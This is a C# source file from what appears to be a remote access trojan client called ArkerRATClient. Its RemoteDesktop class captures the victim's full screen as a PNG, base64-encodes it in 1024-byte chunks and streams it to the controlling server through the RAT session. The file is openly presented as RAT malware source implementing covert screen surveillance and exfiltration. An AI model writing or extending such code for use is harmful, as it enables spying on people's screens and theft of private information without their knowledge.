using ArkerRATClient;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARKERRATCLIENT2._0
{
    public static class RemoteDesktop
    {
        public static string data = "";
        public static async Task RemoteDesktopFunction()
        {
          
            if (!RATClientSession.noConnection)
            {
                byte[] frameBytes = ScreenShotToByteArray();
                int bufferSize = 1024;
                for (int i = 0; i < frameBytes.Length; i += bufferSize)
                {
                    int remainingBytes = frameBytes.Length - i;
                    int bytesToSend = Math.Min(remainingBytes, bufferSize);
                    byte[] buffer = new byte[bytesToSend];
                    Array.Copy(frameBytes, i, buffer, 0, bytesToSend);
                    string b64formate = Convert.ToBase64String(buffer);
                    //Fix base64 length divideable with 4.
                    while ((b64formate.Length) % 4 != 0)
                    {
                        b64formate += '=';
                    }
                    await RATClientSession.SendData(b64formate + "§RemoteDesktop§");
                }
                await RATClientSession.SendData("§RemoteDesktopFrameDone§§RemoteDesktop§");
            }
        }

        private static byte[] ScreenShotToByteArray()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                Image frame = bmp;
                using (MemoryStream mStream = new MemoryStream())
                {
                    frame.Save(mStream, System.Drawing.Imaging.ImageFormat.Png);
                    return mStream.ToArray();
                };


            }
        }
    }
}
